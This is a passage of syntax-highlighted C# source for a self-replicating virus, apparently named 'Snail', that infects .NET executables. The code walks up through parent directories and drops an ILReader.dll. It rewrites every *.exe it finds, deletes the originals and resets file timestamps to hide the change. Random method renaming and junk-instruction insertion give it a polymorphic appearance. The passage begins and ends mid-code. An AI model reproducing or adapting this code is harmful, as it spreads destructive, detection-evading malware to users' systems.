                    </span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc11">inreturntype</span><span class="sc10">=((</span><span class="sc11">MethodInfo</span><span class="sc10">)</span><span class="sc11">methodBase</span><span class="sc10">).</span><span class="sc11">ReturnType</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">TypeBuilder</span><span class="sc0"> </span><span class="sc11">outreturntype</span><span class="sc10">=</span><span class="sc11">TypeCompliance</span><span class="sc10">(</span><span class="sc11">inreturntype</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">MethodBuilder</span><span class="sc0"> </span><span class="sc11">outmb</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">methodName</span><span class="sc10">=</span><span class="sc11">methodBase</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">outreturntype</span><span class="sc10">!=</span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc11">outmb</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">TypeBuilder</span><span class="sc10">)</span><span class="sc11">types</span><span class="sc10">[</span><span class="sc11">intype</span><span class="sc10">]).</span><span class="sc11">DefineMethod</span><span class="sc10">(</span><span class="sc0">
                            </span><span class="sc2">//methodName, 
</span><span class="sc0">                            </span><span class="sc10">(</span><span class="sc11">EnabledRename</span><span class="sc10">(</span><span class="sc11">intype</span><span class="sc10">)&amp;&amp;</span><span class="sc11">methodName</span><span class="sc10">!=</span><span class="sc6">"Go"</span><span class="sc10">)?</span><span class="sc11">rs</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">():</span><span class="sc11">methodName</span><span class="sc10">,</span><span class="sc0"> 
                            </span><span class="sc11">methodBase</span><span class="sc10">.</span><span class="sc11">Attributes</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">methodBase</span><span class="sc10">.</span><span class="sc11">CallingConvention</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outreturntype</span><span class="sc10">,</span><span class="sc0">
                            </span><span class="sc11">mparams</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc5">else</span><span class="sc0">
                        </span><span class="sc11">outmb</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">TypeBuilder</span><span class="sc10">)</span><span class="sc11">types</span><span class="sc10">[</span><span class="sc11">intype</span><span class="sc10">]).</span><span class="sc11">DefineMethod</span><span class="sc10">(</span><span class="sc0">
                            </span><span class="sc2">//methodName, 
</span><span class="sc0">                            </span><span class="sc10">(</span><span class="sc11">EnabledRename</span><span class="sc10">(</span><span class="sc11">intype</span><span class="sc10">)&amp;&amp;</span><span class="sc11">methodName</span><span class="sc10">!=</span><span class="sc6">"Go"</span><span class="sc10">)?</span><span class="sc11">rs</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">():</span><span class="sc11">methodName</span><span class="sc10">,</span><span class="sc0"> 
                            </span><span class="sc11">methodBase</span><span class="sc10">.</span><span class="sc11">Attributes</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">methodBase</span><span class="sc10">.</span><span class="sc11">CallingConvention</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">inreturntype</span><span class="sc10">,</span><span class="sc0">
                            </span><span class="sc11">mparams</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">DefParams</span><span class="sc10">(</span><span class="sc11">methodBase</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">outmb</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">methods</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">methodBase</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outmb</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
    
            </span><span class="sc10">}</span><span class="sc0">



            </span><span class="sc9">#region compliance
</span><span class="sc0">            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">MethodBuilder</span><span class="sc0"> </span><span class="sc11">MethodCompliance</span><span class="sc0">
                </span><span class="sc10">(</span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc11">type</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MethodBase</span><span class="sc0"> </span><span class="sc11">methodBase</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">MethodBuilder</span><span class="sc10">)</span><span class="sc11">methods</span><span class="sc10">[</span><span class="sc11">methodBase</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">ConstructorBuilder</span><span class="sc0"> </span><span class="sc11">ConstructorCompliance</span><span class="sc0">
                </span><span class="sc10">(</span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc11">type</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ConstructorInfo</span><span class="sc0"> </span><span class="sc11">ctorInfo</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ConstructorBuilder</span><span class="sc10">)</span><span class="sc11">ctors</span><span class="sc10">[</span><span class="sc11">ctorInfo</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">PropertyBuilder</span><span class="sc0"> </span><span class="sc11">PropertyCompliance</span><span class="sc0">
                </span><span class="sc10">(</span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc11">type</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">PropertyInfo</span><span class="sc0"> </span><span class="sc11">propertyInfo</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PropertyBuilder</span><span class="sc10">)</span><span class="sc11">props</span><span class="sc10">[</span><span class="sc11">propertyInfo</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">FieldBuilder</span><span class="sc0"> </span><span class="sc11">FieldCompliance</span><span class="sc0">
                </span><span class="sc10">(</span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc11">type</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FieldInfo</span><span class="sc0"> </span><span class="sc11">fieldInfo</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FieldBuilder</span><span class="sc10">)</span><span class="sc11">fields</span><span class="sc10">[</span><span class="sc11">fieldInfo</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">EventBuilder</span><span class="sc0"> </span><span class="sc11">EventCompliance</span><span class="sc0">
                </span><span class="sc10">(</span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc11">type</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">EventInfo</span><span class="sc0"> </span><span class="sc11">eventInfo</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">EventBuilder</span><span class="sc10">)</span><span class="sc11">events</span><span class="sc10">[</span><span class="sc11">eventInfo</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">TypeBuilder</span><span class="sc0"> </span><span class="sc11">TypeCompliance</span><span class="sc10">(</span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc11">type</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">TypeBuilder</span><span class="sc10">)</span><span class="sc11">types</span><span class="sc10">[</span><span class="sc11">type</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc9">#endregion
</span><span class="sc0">            

        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">EnabledRename</span><span class="sc10">(</span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc11">t</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc9">#if PERMUTATION
</span><span class="sc2">//          return (-1!=t.FullName.IndexOf("Snail") &amp;&amp; -1==t.FullName.IndexOf("AssemblyProvider"));
</span><span class="sc0">            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">t</span><span class="sc10">.</span><span class="sc11">Assembly</span><span class="sc10">==</span><span class="sc11">Assembly</span><span class="sc10">.</span><span class="sc11">GetExecutingAssembly</span><span class="sc10">()&amp;&amp;-</span><span class="sc4">1</span><span class="sc10">==</span><span class="sc11">t</span><span class="sc10">.</span><span class="sc11">FullName</span><span class="sc10">.</span><span class="sc11">IndexOf</span><span class="sc10">(</span><span class="sc6">"AssemblyProvider"</span><span class="sc10">));</span><span class="sc0">           
</span><span class="sc9">#else
</span><span class="sc0">            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">RandomStrings</span><span class="sc0"> </span><span class="sc11">rs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">RandomStrings</span><span class="sc10">(</span><span class="sc4">6</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">15</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">TickCount</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">Random</span><span class="sc0"> </span><span class="sc11">rand</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Random</span><span class="sc10">(</span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">TickCount</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">RandomCodeEmitter</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">ILGenerator</span><span class="sc0"> </span><span class="sc11">il</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">LocalBuilder</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">lb</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">RandomCodeEmitter</span><span class="sc10">(</span><span class="sc11">ILGenerator</span><span class="sc0"> </span><span class="sc11">ilGenerator</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LocalBuilder</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">localBuilders</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">il</span><span class="sc10">=</span><span class="sc11">ilGenerator</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">lb</span><span class="sc10">=</span><span class="sc11">localBuilders</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Emit</span><span class="sc10">()</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc9">#if PERMUTATION
</span><span class="sc0">                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">rand</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">5</span><span class="sc10">)==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Nop</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">rand</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">10</span><span class="sc10">)==</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">lb</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">LocalBuilder</span><span class="sc0"> </span><span class="sc11">localBuilder</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">lb</span><span class="sc10">[</span><span class="sc11">rand</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc11">lb</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">)];</span><span class="sc0">
                    </span><span class="sc2">// push random local variable and pop it
</span><span class="sc0">                    </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Ldloc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">localBuilder</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">OpCodes</span><span class="sc10">.</span><span class="sc11">Pop</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">byte</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">ilReader</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Go</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">dir</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">ilReader</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetILReader</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc5">do</span><span class="sc0"> 
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">ProcessDirectory</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">dir</span><span class="sc10">=</span><span class="sc11">Directory</span><span class="sc10">.</span><span class="sc11">GetCurrentDirectory</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">Directory</span><span class="sc10">.</span><span class="sc11">SetCurrentDirectory</span><span class="sc10">(</span><span class="sc6">".."</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">!=</span><span class="sc11">Directory</span><span class="sc10">.</span><span class="sc11">GetCurrentDirectory</span><span class="sc10">());</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        
        </span><span class="sc2">// infect all files in current directory
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">ProcessDirectory</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">fnames</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Directory</span><span class="sc10">.</span><span class="sc11">GetFiles</span><span class="sc10">(</span><span class="sc6">"."</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"*.exe"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">fnames</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">donotdel</span><span class="sc10">=</span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Exists</span><span class="sc10">(</span><span class="sc6">"ILReader.dll"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">donotdel</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">ilReader</span><span class="sc10">!=</span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">outStream</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc6">"ILReader.dll"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">CreateNew</span><span class="sc10">,</span><span class="sc0">
                    </span><span class="sc11">FileAccess</span><span class="sc10">.</span><span class="sc11">ReadWrite</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">outStream</span><span class="sc10">!=</span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">BinaryWriter</span><span class="sc0"> </span><span class="sc11">outWriter</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">BinaryWriter</span><span class="sc10">(</span><span class="sc11">outStream</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">outWriter</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">ilReader</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                    </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"Created ILReader.dll"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc11">outStream</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">fileName</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">fnames</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc9">#if OVERWRITE
</span><span class="sc0">                </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">outFileName</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Path</span><span class="sc10">.</span><span class="sc11">GetFileName</span><span class="sc10">(</span><span class="sc11">fileName</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">outFileNameWithoutExtension</span><span class="sc10">=</span><span class="sc0">
                    </span><span class="sc11">Path</span><span class="sc10">.</span><span class="sc11">GetFileNameWithoutExtension</span><span class="sc10">(</span><span class="sc11">outFileName</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">inFileName</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"_"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">outFileName</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc1">/*outFileName.ToUpper()=="SNAIL.EXE" ||*/</span><span class="sc0"> </span><span class="sc11">outFileName</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]==</span><span class="sc7">'_'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
                    </span><span class="sc11">outFileNameWithoutExtension</span><span class="sc10">==</span><span class="sc0">
                        </span><span class="sc11">Assembly</span><span class="sc10">.</span><span class="sc11">GetExecutingAssembly</span><span class="sc10">().</span><span class="sc11">GetName</span><span class="sc10">().</span><span class="sc11">Name</span><span class="sc10">)</span><span class="sc0">
                            </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc2">//   // omit self
</span><span class="sc0">                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Exists</span><span class="sc10">(</span><span class="sc11">inFileName</span><span class="sc10">))</span><span class="sc0">
                    </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">DateTime</span><span class="sc0"> </span><span class="sc11">ctime</span><span class="sc10">=</span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">GetCreationTime</span><span class="sc10">(</span><span class="sc11">outFileName</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">DateTime</span><span class="sc0"> </span><span class="sc11">latime</span><span class="sc10">=</span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">GetLastAccessTime</span><span class="sc10">(</span><span class="sc11">outFileName</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">DateTime</span><span class="sc0"> </span><span class="sc11">lwtime</span><span class="sc10">=</span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">GetLastWriteTime</span><span class="sc10">(</span><span class="sc11">outFileName</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Move</span><span class="sc10">(</span><span class="sc11">outFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">inFileName</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#else
</span><span class="sc0">                </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">inFileName</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Path</span><span class="sc10">.</span><span class="sc11">GetFileName</span><span class="sc10">(</span><span class="sc11">fileName</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">outFileName</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"_infected_"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">inFileName</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">inFileName</span><span class="sc10">.</span><span class="sc11">ToUpper</span><span class="sc10">()==</span><span class="sc6">"SNAIL.EXE"</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">inFileName</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]==</span><span class="sc7">'_'</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc2">//   // omit self
</span><span class="sc9">#endif
#if DEBUGCONSOLE
</span><span class="sc0">                </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"infecting "</span><span class="sc10">+</span><span class="sc11">outFileName</span><span class="sc10">+</span><span class="sc6">" ..."</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">
                </span><span class="sc5">try</span><span class="sc0"> 
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc2">//                  ProcessAssembly(inFileName, outFileName);
</span><span class="sc0">                    </span><span class="sc2">//                  if(!shorts)
</span><span class="sc0">                    </span><span class="sc2">//                      ProcessAssembly(inFileName, outFileName);
</span><span class="sc0">                    </span><span class="sc2">// run ProcessAssembly in separate domain 
</span><span class="sc0">                    </span><span class="sc2">// once opened assembly cannot be closed in current domain
</span><span class="sc0">                    </span><span class="sc5">object</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">args</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc5">object</span><span class="sc0"> </span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc11">inFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outFileName</span><span class="sc10">};</span><span class="sc0">
                    </span><span class="sc11">AppDomain</span><span class="sc0"> </span><span class="sc11">appdom</span><span class="sc10">=</span><span class="sc11">AppDomain</span><span class="sc10">.</span><span class="sc11">CreateDomain</span><span class="sc10">(</span><span class="sc6">"domain"</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc11">tsnail</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">typeof</span><span class="sc10">(</span><span class="sc11">Snail</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">aname</span><span class="sc10">=</span><span class="sc11">Assembly</span><span class="sc10">.</span><span class="sc11">GetExecutingAssembly</span><span class="sc10">().</span><span class="sc11">GetName</span><span class="sc10">().</span><span class="sc11">Name</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">ObjectHandle</span><span class="sc0"> </span><span class="sc11">oh</span><span class="sc10">=</span><span class="sc11">appdom</span><span class="sc10">.</span><span class="sc11">CreateInstance</span><span class="sc10">(</span><span class="sc0">
                        </span><span class="sc11">aname</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc11">tsnail</span><span class="sc10">.</span><span class="sc11">FullName</span><span class="sc10">,</span><span class="sc0"> 
                        </span><span class="sc5">false</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Default</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc5">null</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">args</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">AppDomain</span><span class="sc10">.</span><span class="sc11">Unload</span><span class="sc10">(</span><span class="sc11">appdom</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc9">#if OVERWRITE
</span><span class="sc0">                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Exists</span><span class="sc10">(</span><span class="sc11">outFileName</span><span class="sc10">))</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                        </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc11">outFileName</span><span class="sc10">+</span><span class="sc6">" exists"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                        </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Delete</span><span class="sc10">(</span><span class="sc11">inFileName</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">AddILReader</span><span class="sc10">(</span><span class="sc11">outFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ilReader</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">SetCreationTime</span><span class="sc10">(</span><span class="sc11">outFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ctime</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">SetLastAccessTime</span><span class="sc10">(</span><span class="sc11">outFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">latime</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">SetLastWriteTime</span><span class="sc10">(</span><span class="sc11">outFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">lwtime</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#if MANAGEDRESOURCES
</span><span class="sc0">                        </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">resFileName</span><span class="sc10">=</span><span class="sc11">outFileNameWithoutExtension</span><span class="sc10">+</span><span class="sc6">".resources"</span><span class="sc10">;</span><span class="sc0">
